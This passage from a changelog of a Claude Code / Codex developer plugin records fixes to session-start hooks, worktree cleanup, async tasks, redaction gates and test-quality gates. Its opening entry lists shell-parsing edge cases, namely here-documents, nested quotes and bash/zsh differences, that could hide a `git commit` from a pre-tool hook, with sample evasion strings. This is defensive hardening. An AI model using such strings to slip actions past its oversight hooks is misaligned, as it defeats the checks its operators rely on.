`EOF`, then `git commit` or `git status` is refused. A command whose input or rewritten text is longer than 128 KiB is refused when it may commit or push. The rewrite copies a unit nested in `"..."` without its quotes instead of escaping it, so the rewritten text is at most four times the input whatever the nesting (it was about four times larger per nesting level). The PreToolUse hook exits 2 on an unexpected exception when a string of the tool input holds the word `git`, including tab and backslash-newline spacing. An unquoted here-document body joins a backslash-newline before the delimiter match, a `(` right after a word character is zsh's glob group (no comment inside `x=a(#b)`); a `#` right after `(` or `)` is never dropped as a comment (zsh reads `[[ a == (a|b)#x ]]`, `case a in (a)#x)` and `=(cmd)#x` as words), and the command is refused when it may commit or push and the rest of that line holds a quote, `$`, a backtick, a backslash, `<`, `(` or `)`, and a `${...}` in a here-document delimiter that zsh ends at a later brace is refused. A quote, `$(...)`, `${...}` or backtick string is read as one unit wherever it appears, so its own quotes, `<<` and `#` cannot end it early: a `"` inside `"$(...)"` does not close the outer string (POSIX §2.2.3), so `echo "$(echo "<<EOF ")"` followed by a `git commit` line is gated and `n="$(grep -c "<<EOF" f)"` is no longer refused; bash's `$'...'` ends at the first `'` not escaped by a backslash; the here-document word `<<$(echo)` holds the whole `$(echo)`. A `case` is counted as reserved only as the first word of a command: not after an assignment prefix (bash), not as the target of a redirection (`&>` and `&>>` included), and `esac` also ends an empty case right after `in`; words are matched with their backslash-newlines removed. So `echo $(echo case)#x; git commit` is gated. A bare `{` inside `${...}` is text in bash, and in zsh only inside double quotes, so `"${x:-{}"; git commit` is gated; unquoted, where zsh counts the brace and ends the expansion later, the command is refused when it may commit or push and the text between the two ends holds an operator, quote, newline, `#` or `$`. zsh's `case WORD { ... }` form is refused the same way. A here-document still pending where a `$(...)` ends, or a `'` inside a double-quoted `${...}`, makes bash and zsh read different lines as commands: the command is refused when it may commit or push. A word `NAME[...]` holding `<<` is refused when the command may commit or push: bash reads it as a subscript and runs the next lines, zsh reads a here-document.

- Web-research agents can use the crawl4ai MCP (#170). The 104 agents that hold `WebSearch`/`WebFetch` now also list `mcp__crawl4ai__search`, `scrape`, `extract`, `answer`, `batch`, `serp` and `estimate`; the credit-spending tools (`topup`, `spend_cap`, `recharge`, `plans`) are left out. The research-provenance hook now fires on those calls too and records their `q`, `url` and `urls` arguments, with or without `jq`.

- The async-task tests no longer leave processes behind (#168). `test_worker_sigterm_writes_terminal_state_and_stops_the_command` left a `cat <tmp>/term.hold` with ppid 1 on every run (68 accumulated on one machine) because its command was `sh -c "...; cat FIFO"`: the worker forwards SIGTERM to the command (`sh`, as `docs/async-tasks.md` says), `sh` died, and its `cat` child stayed blocked on the fifo. The blocked command now `exec`s into `cat`, so the announced pid is the one blocker and waiting for it waits for the blocker itself, and the SIGKILL and reaper tests release their fifo in a `finally`. Not a product bug: the worker documents that it signals the command, not its descendants. A new autouse guard in `tests/conftest.py` (`tests/leak_support.py`) scans, after each test's own teardown, for live non-zombie processes whose argv names the test's `tmp_path` (`/proc` on Linux, `ps` elsewhere; no timers), kills them and fails the test with their pids, so no leak survives the run that found it.

- The leak guard (#168) now runs only for tests that can start processes: those marked `spawns` (the task, worker, memory-daemon and worktree-sweep modules) and those using the `spawning` fixture (the task `state` fixtures); scanning every process after every one of the 1858 tests cost about 38 s on macOS (200.8 s against 162.9 s without the guard; 166.6 s scoped). The guard matches the test's `tmp_path` only as a whole path component (`test_x1` no longer matches `test_x10/`) and reads macOS `ps -ww`, because plain `ps` cuts argv at the terminal width. The PII daemon that `memory-tool.sh` starts for a `MEMORY_ROOT` is long-lived by design (idle exit after 30 s, SIGTERM stops it and removes its socket and pid sidecar); `test_acl_check_gates_writes_through_the_tool` left it running on CI, where the socket path is short enough to bind (beyond the 104-byte AF_UNIX limit of macOS's long tmp paths the daemon never starts, so the leak did not show locally). It now stops the daemon through SIGTERM to the pid sidecar and waits for its exit as an OS event.

## [2.45.1]: session start only reports stale branches and the sweep deletes only what is provably preserved, at a fraction of the boot cost

### Fixed

- Session start no longer deletes anything, and the explicit `worktree-manager.sh sweep` can no longer delete work that is not preserved elsewhere (#166). A real sweep run at session start deleted six local branches of a real repo on 2026-10-15; review of #165 then proved on scratch repos that the patch-id squash test followed by `git branch -D` deleted a local-only branch whose whitespace-only change patch-id-matches a different main commit, and a branch squash-merged then reverted on main (work no longer on main). The boot `worktrees` section now runs `worktree-manager.sh report`: one line per stale branch or worktree with the exact explicit command, nothing deleted, no per-branch work on the hot path. Classification is a detached async task (`tools/lib/tasks.py`, kind `wtclass`) keyed by a hash of the repo's refs state that runs `sweep --dry-run`; boot prints the finished result or `classification running` and never waits. The sweep deletes a branch only when its changes are on origin/main (an ancestor, or `git merge-tree --write-tree` yields origin/main's own tree) and it is checked out nowhere; deletion is `git branch -d`, never `-D`, against a private proof upstream whose persisted tracking config (`branch.<b>.remote`/`merge`, multi-valued, set by `checkout -b x origin/main` and `worktree add -b x origin/main`) is replaced for the duration of the delete and restored exactly when git refuses, so a squash-merged branch with that tracking is deleted instead of refused as "not fully merged"; a refusal is printed with git's reason on every path, `--dry-run` and the real sweep decide alike, and proof refs left by a SIGKILLed sweep are purged at the next one. The patch-id index and the 500-commit scan limit are gone. Measured on a shared replica of Cortex (36 local branches, 485 commits on main), 5 runs each: the old section took 6.1 to 7.3 s and deleted 6 branches per run; the new one returns in 0.19 to 0.22 s cold and warm with all 36 branches intact, its classification finishing in 2.3 s as a detached task. A squash-merged branch whose remote ref was pruned is deleted all the same (the tree check proves its work is on origin/main); see `docs/worktree-sweep.md`.

- Session start no longer spends its whole 8 s budget in the `worktrees` section (#165). The cause was not a descendant that kept the group alive: the section's own main process, `worktree-manager.sh sweep`, was still running. For every branch not merged into origin/main its squash-merge test forked `git diff` and `git patch-id` once per main commit (up to 500), and it did so again for every branch because the cache lived in a `$(...)` subshell: 31 branches took 94 s on Cortex. The patch-ids of main are now indexed once per repo by one `git log -p | git patch-id` pipeline, and `branch_merge_kind` reports through `MERGE_KIND` instead of stdout. The runner (`hooks/lib/run_sections.py`) now says in the report when it kills a section that was still running at the budget, and a test pins that it never waits for, nor kills, the descendants of a section that has finished.

## [2.45.0]: session start stops paying its time-boxes and runs its sections in parallel, a process-group runner, a shared async-task module

### Added

- A shared async-task module, `tools/lib/tasks.py` (shell front door `tools/task.sh`,
  contract in `docs/async-tasks.md`), so slow work stops being run under a time
  budget. `start` returns at once and launches a detached worker (its own session,
  so killing the caller's process group does not reach it); the worker writes a JSON
  record `queued|running|done|failed` keyed by `<kind>-<content hash>`, with the full
  output kept in a file; creating the record is the dedup and a green record is the
  cached proof; a worker that dies without a terminal state is found by pid liveness,
  not by a clock, and retried only by an explicit, counted `requeue`; failures go to
  an inbox that is drained once. There is no `wait()`. Nothing uses it yet: gates,
  hooks and the session start move onto it in later changes. The tests use no sleep
  or timeout (process exit, FIFO EOF and thread events only) and prove on macOS that
  a task keeps running and writes its terminal state after the process group that
  started it is SIGKILLed. Liveness reads `/proc/<pid>/stat` on Linux (python:slim has no
  `ps`, busybox `ps` has no `lstart`) and `ps` only on macOS; a platform that can do
  neither raises an error naming it, and "unknown" is never read as "dead". `requeue`
  re-reads the record after winning its claim, so a stale requeuer cannot launch an
  attempt twice, and refuses (`orphaned`) while a process of the failed attempt's group
  is still alive. (#163)

### Fixed

- The session-start hook paid every time-box in full on macOS. Without
  coreutils `timeout`, the portable watchdog's `sleep` inherited the caller's
  stdout, so `| sed` and `$(...)` waited for it: 38.6 s measured against a
  5-10 s hook budget, while each tool runs in under 0.2 s. (#160)
- A hung session-start tool no longer survives its budget through its own
  children. The shell watchdog of #160 killed only the direct child, so a
  grandchild kept the `$(...)` / `| sed` pipe open and the hook never
  returned; `hooks/lib/run_sections.py` now runs each boot section in its own
  process group with an 8 s budget and kills the whole group. Output is
  byte-identical on the normal path. A boot without a Python 3 now says so on
  stdout instead of dropping the six sections silently; the runner reports its
  own failure with the real exception and exits 0 itself (not through the
  caller's `|| true`); a SIGTERM or SIGINT kills every live section group and
  removes the runner's temp directory; a sweep SIGKILLed during
  `git worktree remove` is no longer reported "dirty" without explanation: a
  marker in the worktree's admin directory records the interrupted removal, and
  the next sweep deletes nothing and never runs `git worktree prune` (it would
  drop other sessions' admin entries whose directories are momentarily missing).
  It prints one line per case (path, whether the directory and `.git` link are
  present, and the exact `git worktree remove --force` / `git worktree prune
  --expire now` commands for a human) and keeps the marker so the line repeats
  until resolved; a registered checkout with a missing directory or `.git` link
  is reported the same way. The ordinary dirty check now reads status with
  `--untracked-files=all --ignored` (a `status.showUntrackedFiles=no` config no
  longer hides user files from it) and holds back a checkout that contains an
  empty directory. A failed removal clears its marker. After the first SIGTERM
  or SIGINT the runner ignores further ones, so the cleanup cannot be re-entered. (#162)
- `memory-tool.sh scopes` spawned two python interpreters and two `find`s per
  scope: 4.4 s of the 8.3 s median of `session-start.sh` with 38 scopes. One
  process (`tools/lib/memory_acl.py`) now answers for all scopes; the hook's
  median is 0.8 to 1.3 s (limit 3 s). Latency of every hook:
  `docs/verification/hook-latency-2026-10-14.md`, reproducible with
  `scripts/measure-hook-latency.py`. (#162)

### Changed

- The session-start sections (plugin currency, difficulty books, memory,
  worktrees and sweep, dev symlinks, session cache) run in parallel and are
  printed in their original order: 11.6 s sequential, 4.6-6.7 s parallel,
  measured on macOS 2026-10-14. (#160)
- `tools/memory-tool.sh` (1396 lines, five functions of 72 to 176 lines, which
  the craftsmanship commit gate rejects for any edit) is split into seven
  sourced modules under `tools/lib/` plus `memory_admin.py`, which now holds the
  `audit` and `ttl-sweep` reporting that lived in shell heredocs. Behaviour is
  unchanged: 118 commands across three agent identities give identical output
  before and after, and the seven `scripts/test-memory-*.sh` suites pass.
  `memory-tool.sh --help` prints the usage header instead of every comment of
  the file. (#162)

## [2.44.0]: a per-task engineering-cycle ledger enforced at the stop, Hindsight retention removed

### Added

- A per-task engineering-cycle ledger, enforced by two hooks. `post-edit-cycle-open`
  (PostToolUse) opens a task at the first edit of a file of a git work tree that git
  does not ignore; `stop-cycle-gate` (Stop and SubagentStop) closes it when the
  stopping agent's transcript and checked declarations prove every stage of
  `/zetetic:engineering-loop`, and blocks until then, by default. The check is proven
  only by a foreground run of exactly the declared command (one `cd <dir> &&` allowed)
  that exits 0 after the last edit; a review is the `code-review` or `zetetic:review`
  skill or a `code-reviewer` agent, and the refine stage the `refine` skill by exact
  name. A subagent's task is judged on its own transcript and windowed by its agent
  id, even when its edits carried no session id; a main-agent task of another or no
  session is judged on its own recorded transcript. One task per agent is kept under
  an OS file lock; when the lock stays held past its timeout the task is still opened
  and the row says why, since a duplicate blocks and a dropped task would not.
  `ZETETIC_CYCLE_GATE=off` lets a stop through and closes the task as bypassed, once.
  `tools/cycle_ledger.py` lists, declares and measures (`metrics`: promise rate and
  reopens per agent type; a bypassed task counts only as a bypass). (#156)

### Changed

- The append-only JSONL ledger contract moved from `tools/reflection_ledger.py` to
  `tools/gates_jsonl.py`, now shared by the reflection and cycle ledgers, with the
  bounded git runner and the read-then-append lock both use. (#156)
- `subagent-stop-reflection` records the newer final message when the same subagent
  stops again (the cycle gate can block its first stop), and schedules nothing for a
  run Claude Code spawns inside a tool (no agent type, no `agent-<id>.jsonl`, no
  `meta.json`, such as the WebFetch summariser); it says so on stderr. A typed subagent
  whose transcript was not located is still scheduled. (#156)

### Removed

- `subagent-stop-reflection` no longer retains each subagent run into Hindsight:
  Hindsight was uninstalled on 2026-10-13 because it duplicated Cortex. The hook
  writes the pending row only, with no `hindsight` field and no second
  `hindsight_for` line, and prints no Hindsight status. `tools/reflection_hindsight.py`
  is gone. Ledgers written by 2.43.0 still read correctly: their `hindsight_for`
  lines carry no `agent_id`, so they are never pending. (#157)

## [2.43.0]: a reflection after every subagent, the memory MCP server found from any cwd, a lock check upstream releases cannot fail

### Added

- A reflection step after every subagent, enforced by two hooks (#153).
  `subagent-stop-reflection` (SubagentStop) records a pending reflection in
  `<git-common-dir>/zetetic-gates/reflections.jsonl` (written before any
  network call) and retains the run into Hindsight when it is configured for
  the cwd, within a 4 s total deadline, over https or loopback http only (a redirect is refused, never followed),
  reporting on stderr and in a second ledger line keyed by agent id when it is
  not configured, refused or the server is down. `stop-reflection-gate`
  (Stop) blocks the orchestrator while its session has a pending reflection (a
  row or a Stop event without a `session_id` is reported as unattributed and
  still blocks, never assigned to a session) and
  names the procedure: one Cortex memory tagged `lesson-candidate` with
  `agent_topic=<agent type>`, then `tools/reflection_ledger.py lift`, which
  refuses without the Cortex memory id.

### Fixed

- `.mcp.json` launched `tools/memory-mcp-server.py` with a path relative to the
  session's cwd, so the memory MCP server failed to connect whenever the
  session's working directory wasn't the plugin root. It now resolves via
  `${CLAUDE_PLUGIN_ROOT}`, matching the convention every hook in this repo
  already uses (fixes #149, #150).

- The CI check that `requirements-dev.lock` matches `requirements-dev.txt`
  compiled into an empty file, so it re-resolved every transitive dependency
  to the newest release on PyPI and failed whenever one of pytest's
  dependencies published, with no change in this repository: packaging (#96),
  pygments (#117), and iniconfig 2.3.1, which turned main red at d42543a. The
  regenerate command it printed could not clear the error, because uv keeps
  the existing pins of the `-o` file it writes to. The check now copies the
  committed lock to its output file before compiling, so it fails only when
  `requirements-dev.txt` asks for something the lock does not hold, and the
  printed command then fixes it. Transitive pins move only when someone adds
  `--upgrade` to that command (#154).

## [2.42.1] : binary asset changes in the deletion gate (#151)

- The deletion gate now checks each path's supported language before reading its
  contents as text. Adding, replacing, renaming or deleting PNG assets no longer
  crashes the hook with `UnicodeDecodeError`. Source deletions and renames across
  supported/unsupported extensions still receive the existing definition checks.
- The standalone `zetetic-gates` package is synchronized and bumped to 1.1.1;
  Claude, Codex and marketplace versions are updated together.

## [2.42.0]: one set of gates for Claude Code and Codex, a fail-before gate that proves a new test can fail, goal-driven iteration on both hosts

### Added

- Portable `advisor-model` consultation and `/zetetic:advisor-loop`, composed with
  goal iteration while retaining executor ownership. Advisor records survive
  resume and share the goal budget. Accepted criterion proposals verify the old
  contract before refinement; a required declined advisor blocks execution (#142).

- Goal-driven iteration as four portable skills (`goal`, `plan`, `verify-goal`,
  `refine-goal`) packaged in `plugins/zetetic-loop` for Codex and Gemini CLI, and
  the `/zetetic:goal-loop` command that runs one tick of the cycle under the
  native `/goal` or `/loop`. The goal file `.zetetic/goals/<slug>.md` is the
  contract: end state, non-goals, criteria as commands with expected results,
  budget, iteration ledger. The native goal command receives a one-line mirror (#141).

- Shared Claude Code and Codex gates in both plugin packages: host event
  adaptation, source and craftsmanship validation, indexed-content checks,
  blocking prose checks and common policy loading. Hook trust stays under
  Codex control (#139).

- **zetetic-gates 1.1.0: a fail-before gate (#140).** `rules/coding-standards.md` §12
  states that coverage proves code ran, not that a test would fail if the code
  were wrong; until now only a reviewer's diligence enforced it, and a reviewer
  reading a test cannot see that it passes on the old code. On 2026-09-16 a
  Cortex test meant to pin "this script imports without the MCP SDK" used the
  pre-PEP 451 finder protocol CPython ignores, blocked nothing, and passed
  against the very commit that had broken CI; the author, the CI run and a
  first review pass all missed it. `plugins/zetetic-gates/tools/fail-before-checker.sh`
  mechanises the check that caught it: it copies the changed test files over a
  throwaway checkout of the base, runs the tests the diff added, and names
  every new pytest node that still passes (`VACUOUS`, warning by default,
  blocking under strict). A run that reaches no verdict, no runner, budget
  exceeded, a runner exiting without testing, is `INCONCLUSIVE` and never a
  pass. `hooks/pre-push-fail-before.sh` wires it to `git push`. Eleven regression
  cases in `tools/tests/fail-before/`, including a vacuous test beside a failing
  sibling, which a file-level verdict would hide. Rationale: `plugins/zetetic-gates/docs/fail-before.md`.

### Fixed

- The fail-before gate runs from the shared dispatcher, so it is active under
  Codex as well as Claude Code; the Bash-only hook entry that made Claude Code
  the only host is gone, and the gate runs once per push (#144).

- The goal cycle dispatches from the current plan verdict, reopens completed
  goals when criteria change, and checks portable budgets without resetting
  counters on repair. The final permitted iteration can complete verification
  before the next plan is refused (#141).
- The agent-ID test cleanup skips empty target paths; an empty target made the
  trap sweep every real linked worktree of the repository (same fix as #139) (#141).
- Shared gates preserve the declared source profile and Git verb, allow
  repository selectors on non-commit/push commands, and tolerate malformed
  shell quoting after tool execution. Tool matchers retain secret coverage;
  unchanged Claude hooks retain their timeouts. Checker-error and prose
  blocking policies are documented (#139).

- Empty-file TAP wrappers are recognized using canonical absolute paths as well
  as relative paths. Node 20 otherwise reported an empty JavaScript file as a
  passing test and caused a false VACUOUS finding (#140).

- The tools CI job installs the hashed Python test lock before running the
  fail-before suite. Missing pytest now fails that suite instead of reporting
  a successful skip (#140).

- Propagation-test cleanup removes only its owned temporary directory. An empty
  parent array previously made its EXIT trap remove unrelated linked worktrees,
  including dirty worktrees, during local full-suite validation (#140).

- Fail-before verdicts require reported test outcomes; setup errors and skipped
  pytest nodes remain inconclusive. Push hooks resolve the target repository
  and relay configuration failures (#140).


## [2.41.0]: the plugin's state lives under ~/.claude/zetetic/, migrated once, with a layout report at the end of setup

### Fixed

- **The plugin's state lives under `~/.claude/zetetic/`, not flat at the root
  of `~/.claude` (#137).** `setup.sh` and the tools wrote `.zetetic-manifest`,
  `.zetetic-manifest.json`, `.zetetic-version`, `zetetic-agent-models.json`,
  `worktree-sweep-audit.log`, `dev-symlink.map` and `dev-symlink.versions`
  straight into `~/.claude`, beside the `goa-phase0/` and `goa-design/`
  labelling workspaces; measured 2026-09-10, the root held 324 entries. Owner
  ruling the same day: what a plugin leaves on disk is managed by the plugin
  and readable at a glance. The files are now `~/.claude/zetetic/manifest`,
  `manifest.json`, `version`, `agent-models.json`, `worktree-sweep-audit.log`,
  `dev-symlink.map`, `dev-symlink.versions`, `goa-phase0/`, `goa-design/`;
  the staged trees (`agents/`, `skills/`, `commands/`, `hooks/`, `tools/`,
  `reference/`) stay where Claude Code expects them. The first `setup.sh` run
  moves a flat install once (a move, so the root entries disappear; a
  user-tuned `zetetic-agent-models.json` is moved as is, never overwritten;
  a second run finds nothing to move), `install`, `update`, `configure` and
  `uninstall` all read the new paths, the `WORKTREE_AUDIT_LOG`,
  `DEV_SYMLINK_MAP` and `DEV_SYMLINK_VERSIONS` overrides keep working, and
  `setup.sh` ends by printing the resulting layout with sizes and per-tree
  counts. Found on the way: `tools/dev-symlink-doctor.sh` created its temp
  file before its state directory existed, which under `set -e` would have
  killed the doctor on the first run into the new directory; the `mkdir -p`
  now comes first. `scripts/test-state-layout.sh` (in CI) covers the
  migration, the idempotent re-run, the fresh install writing only
  `zetetic/` plus the staged trees, the dry run, and both tools' default
  paths, all under a throwaway `HOME` and a throwaway copy of the plugin.
  Issue #136.

## [2.40.1]: the worktree sweep finally sweeps, squash merges and .claude/worktrees included, plus a readable inventory

### Fixed

- **The worktree sweep now recognises squash merges and the repo's own
  `.claude/worktrees/` (#135).** `tools/worktree-manager.sh sweep` decided "merged"
  with `git merge-base --is-ancestor` alone, which is false for every branch
  a GitHub squash merge closes, and it only looked under `/tmp`, so the
  `.claude/worktrees/` location the owner mandated on 2026-09-08 was skipped
  as "deliberate". Measured 2026-09-10 across the anthropic-partnership
  repos: 30 worktrees whose PRs had merged were still standing (10 in
  cortex-viz, 8 in ai-architect-mcp-spec, 11 registered by Cortex under
  `/private/tmp`), the audit log held two lines in two months, and the disk
  had filled to 162 MiB free. A branch is now merged when its tip is an
  ancestor of `origin/main` OR when the patch-id of its cumulative diff
  equals the patch-id of a commit `origin/main` gained since their
  merge-base (bounded by `SQUASH_SCAN_LIMIT`, default 500); the match is
  conservative, so a branch rebased across an overlapping hunk is kept.
  Paths under `<repo>/.claude/worktrees/` are sweepable; anything else
  outside `/tmp` is still never touched. A squash-proven branch is deleted
  with `-D` and the audit line records `merge=squash`. Worktree paths are
  compared physically (`pwd -P`), which the macOS `/var` symlink otherwise
  defeats. `scripts/test-worktree-sweep-safety.sh` gains P4-P7 for the
  squash and in-repo cases. Also fixed on the way: on GNU coreutils the age
  probe ran `stat -f`, which there means file-system status, so the age came
  out empty, read as 0, and every worktree on Linux stayed inside the grace
  period forever; the dialect is now detected before probing.

### Added

- **`tools/worktree-manager.sh inventory [repo ...]` (#135).** One line per linked
  worktree: the verdict sweep will apply (`sweep`, `keep:unmerged`,
  `keep:dirty`, `keep:deliberate-path`), the merge state (`ancestor`,
  `squash`, `unmerged`), the dirty file count, age in days, size, branch
  and path. The owner's ask on 2026-09-10: what an agent leaves on disk has
  to be readable at a glance, not reconstructed from `git worktree list`
  and `du` by hand.

## [2.40.0]: redaction gates on every outbound action and returned message, worktrees inside the repository, rules served on demand, cross-CLI skill packaging

### Fixed

- Both open code-scanning alerts closed, and the CI download flake that
  reddened `main` on an unchanged tree (#134). The ShellCheck job died at
  `curl: (35) Recv failure: Connection reset by peer` fetching the pinned
  shellcheck tarball; `--retry` covers transient HTTP codes and connection
  refusals but not a mid-transfer reset, which needs `--retry-all-errors`.
  Added there and in `.github/workflows/identity.yml`, which had the same
  gap. Alert #43 (`py/unused-import`): `tests/test_redaction_gate.py`
  imported `pytest` without using it. Alert #42 (`py/empty-except`):
  `_load_state` in `hooks/stop-context-guard.py` swallowed `OSError` and
  `JSONDecodeError` with a bare `pass` and no rationale; the behaviour is
  intended (an unreadable, absent or legacy state file degrades the guard to
  the `"none"` level rather than failing the Stop hook), so the fix states
  that at the site. Touching that file put it under the whole-file
  craftsmanship gate, which surfaced eight pre-existing violations: the two
  bounded transcript scans moved to `tools/transcript_scan.py`, loaded by the
  same resolve-beside-the-hook pattern `stop-redaction-gate` uses for
  `redaction_gate.py`, taking the hook from 624 to 500 lines; the three
  over-long functions each split into a guard clause and its loop, which also
  removed all three depth-4 nests; and `_write_stub`'s five parameters became
  one `Trigger` NamedTuple. The scan tests moved with the mechanism to
  `tests/test_transcript_scan.py` unchanged, and the hook gained tests for
  its wrappers including the missing-scanner path on a partial install.

### Added

- **Redaction gate on every outbound action, and a wider detector set (#133).**
  `hooks/pre-tool-redaction-gate.py`, registered on `PreToolUse` for `Bash`
  and the GitHub MCP tools, extracts the prose an action is about to publish
  (commit messages via `-m`/`-F`; PR, issue and release bodies, titles and
  notes via `gh ... --body/--title/--notes/--body-file`; the `body`, `title`
  and `commit_message` fields of `mcp__github__*` calls) and runs it through
  `tools/redaction-checker.sh --stdin`. Same two tiers and the same opt-in as
  the Stop gate: WARN on stderr by default, BLOCK (exit 2, the action is
  refused) under `REDACTION_STOP_BLOCK=on` or `.redaction-gate.json`. The
  mechanism the two hooks share (checker resolution, finding quotes, the
  opt-in) moved to `tools/redaction_gate.py`, so a message and a commit body
  cannot drift onto different rules. The checker gains `BOLD_LABEL` (a line
  or list item opening with a bold label and a colon, redaction.md §15/§16)
  and French renderings of the §5/§20/§23/§28 phrases it already detected in
  English, because the gates scan French sessions. Sixteen list items in
  this file, two in README, one in `docs/AGENT-INTERNALS.md` and two in
  `enterprise/managed-agents/README.md` lost their bold label so the
  tree-wide sweep stays at zero. Suites:
  `tools/tests/pre-tool-redaction-gate` and T18/T19 in
  `tools/tests/redaction-checker`; pytest `tests/test_redaction_gate.py` and
  `tests/test_pre_tool_redaction_gate.py`.

- **Redaction gate on every returned message (#127).**
  `hooks/stop-redaction-gate.py`, registered on `Stop` and `SubagentStop`,
  runs the turn's final assistant text (`last_assistant_message`, with a
  transcript fallback that reassembles the multi-row final message) through
  `tools/redaction-checker.sh --stdin` and quotes each finding with its line
  number and pattern name. The five prose-producing agents carried this as a
  `<redaction-gate>` prompt section; a section is advisory, a hook runs every
  time. Two-tier like `stop-acceptance-gate.py`: WARN on stderr by default,
  BLOCK opt-in via `REDACTION_STOP_BLOCK=on` or a `.redaction-gate.json`
  marker (loop-safe on `stop_hook_active`), fail-open on a missing checker or
  a malformed payload. The block reason hands the skill's full eval back for
  the rewrite; the judgment half (nothing invented, sourced attributions,
  concrete ending) stays with the agent. New `--stdin` mode on the checker
  (no path filter, findings labelled `<stdin>`), so staged copy and returned
  messages share one detector set. Suites: `tools/tests/stop-redaction-gate`
  (27 assertions) and T17 in `tools/tests/redaction-checker`.

### Fixed

- **`setup.sh` no longer copies agents and skills into `~/.claude/` when the
  marketplace plugin is installed (#131).** Claude Code lists a plugin's
  agents and skills from the plugin cache, so the copies made every one of
  them appear twice in each session's prelude and came back on every
  `update` after being removed. The installer now detects the plugin, skips
  both, drops earlier copies as orphans and warns if any remain; standalone
  installs are unchanged. New suite `tools/tests/setup-plugin-served`.

- **Deletion gate: four false-survivor shapes no longer block a move (#130).**
  `find_survivors` in `tools/deletion_gate_git.py` listed, for a removed
  `repo_root`, the `def repo_root()` line of every other Stop hook, their
  bare calls to it, and `args.repo_root` in scripts that never name the hook
  as 23 survivors, so moving one hook's private helper into a shared module
  was blocked at edit time on names the diff never touched. Four rules: a
  file that defines `name` at top level binds its own bare `name(` to that
  definition (Python module scope; a shell script's own function table), so
  the definition line and those calls are dropped, attribute and import
  shapes in such a file still counting; and an attribute shape (`x.name`) in
  a file that never names the defining file is dropped, because it cannot
  hold an object bound to that module (both hook tiers and the CLI pass the
  defining path); a match that sits only inside a line comment is dropped,
  because a comment calls nothing; and in Python a bare `name(` in a file
  that never imports the name is dropped, because a free name resolves in
  its own module's globals (LEGB). Nine tests in
  `tests/test_deletion_gate_git.py`.

- **Phase 7 closeout of the agent-to-skill migration plan (#125).**
  `rules/agent-vs-skill-classification.md`'s `ux-designer` row was stale
  since PR #120 (predated Phase 4/#123's resolution to skill-frontable);
  fixed, plus the zero-coverage count (9 -> 8 agents) and the verdict
  distribution line (9/1/13 -> 9/0/14). Audited all 5 compatibility gates
  named in the original external review (`agent-definition-auditor`,
  `skill-routing-table-drift`, `manifest-gate`,
  `pytest tests/test_portable_package.py`,
  `scripts/generate-skill-agent-model-matrix.py --check`) and confirmed
  every one is wired into `.github/workflows/ci.yml` -- no gap found, no
  new wiring needed.

  Re-ran both benchmark tasks at the pinned sonnet/medium production
  tier: `review_small_diff` (first production-tier data point for this
  task -- non-inferiority now **established**, reversing the prior
  haiku/low smoke run's inconclusive result) and `design_accessibility_audit`
  (second production run, reproducibility check against 2026-09-05's
  baseline -- non-inferiority **re-established**, but this run surfaced
  the benchmark's first-ever completion-rate divergence between
  conditions: `subagent_spawn` completed only 4/5 replications at the
  pre-registered quality threshold, `inline_skill` 5/5). The
  tokens-vs-dollar-cost direction split (subagent cheaper in raw tokens,
  more expensive in real CLI-reported dollars) now has three
  production-tier confirmations in the same direction, still not treated
  as established from this sample size. Full results in
  `tools/bench-agent-cost/README.md`'s negative-result log; raw/scored
  data at `docs/bench-agent-cost/20260906-phase7/`.

  **This phase does not convert any additional team agents to skills.**
  The mixed non-inferiority evidence and the newly observed completion-rate
  divergence argue against a blanket rollout; converting the remaining
  skill-frontable-but-uncovered agents (`data-scientist`,
  `frontend-engineer`, `mlops`, `refactorer`, `simplifier`) is left as
  individual, benchmark-gated follow-up work, never a batch conversion.

### Added

- **Generalized cross-CLI skill packaging + `zetetic-design` package
  (Phase 5, #124).** `tools/sync-portable-references.py` no longer
  hardcodes a single skill: it discovers every skill that opts in via a
  `portable:` frontmatter block on its canonical `skills/**/*.md` source
  (`package:`, and an optional `references:` list of genius agents to
  render), and generates/drift-checks each one's package under
  `plugins/<package>/`. `evidence-synthesis` and `design` (from #123) both
  opt in; `design` proves the mechanism generalizes to a self-contained
  skill with nothing to generate, not just a refactor in the abstract.
  Adds `plugins/zetetic-design/` (Codex `.codex-plugin/plugin.json` +
  Gemini `gemini-extension.json` + `skills/design/SKILL.md`, verified
  against the pinned OpenAI plugin/skill validators), registers it in
  `.agents/plugins/marketplace.json` and `tools/build-release-bundle.sh`,
  and parameterizes `tests/test_portable_package.py`
  (`pytest.mark.parametrize`) over the discovered packages instead of one
  hand-written test per fixture: 12/12 -> 20/20 passed. Verified by removing
  `design`'s `portable:` block: collection drops from 20 to 13 cases (the 7
  `zetetic-design`-parameterized cases disappear) and 2 discovery-guard
  tests that assert `zetetic-design`'s presence fail, leaving 11/13 passing
  -- restoring the block returns 20/20.

- **`skills/design/design.md` + `/design` command + WCAG 2.2 citation fix
  (Phase 4, #123).** `ux-designer` is classified skill-frontable (owner
  decision, 2026-09-04): a new skill fronts it as the primary path,
  adapted from its Move 1-6 procedure and dropping the subagent-only
  boilerplate (`<memory>`, `<worktree>`, `<token-budget>`,
  `<reference-docs>`) -- 415 lines in `agents/ux-designer.md` versus 148
  in the skill (~64% smaller). `commands/design.md` wires `/design` to
  it; investigated against the live Claude Code docs that plugin
  commands namespace as `/<plugin-name>:<command-name>` (never bare),
  so this resolves as `/zetetic-team-subagents:design` and cannot
  collide with Claude Code's separate, host-native `/design` canvas
  tool. Also fixes `agents/ux-designer.md`'s WCAG citation: 2.4.11 and
  2.5.8 were cited under "WCAG 2.1 AA (W3C 2018)" but both criteria were
  introduced in WCAG 2.2 (W3C Recommendation, 5 October 2023) -- verified
  against the published W3C REC text before changing anything.
  `tools/bench-agent-cost/` gained a new `design_accessibility_audit`
  task (pre-registered `completion_threshold_points`, committed before
  any run) and its pinned-production-tier (sonnet/medium, n=5) result:
  non-inferiority established (mean diff 1.5, lower 95% CI bound 0.674).
  The tokens-vs-dollar-cost direction divergence first seen on
  `review_small_diff`'s smoke run reproduces here (2/2 tasks in the same
  direction) -- documented as a pattern worth investigating, not
  established from n=2; a specific cache-warm/cold-start mechanism
  proposed for it was checked against the raw cache-token fields and
  found not to hold in that direction.

- **`tools/bench-agent-cost/`: completion-gated tokens-per-completed-task
  metric (#122).** `analyze_results.py` previously reported mean token
  count over all valid runs regardless of task-completion quality, letting
  a condition that completed the task less often look artificially cheap.
  Each task JSON now carries a `completion_threshold_points` field defining
  the minimum summed rubric points a run must reach to count as completed;
  the rule going forward is that this value is fixed before a task's first
  run and never edited once runs exist for it (Fisher-style
  pre-registration). `analyze_results.py` reports completion rate per
  condition (always shown, including 0%/100%) and mean tokens among only
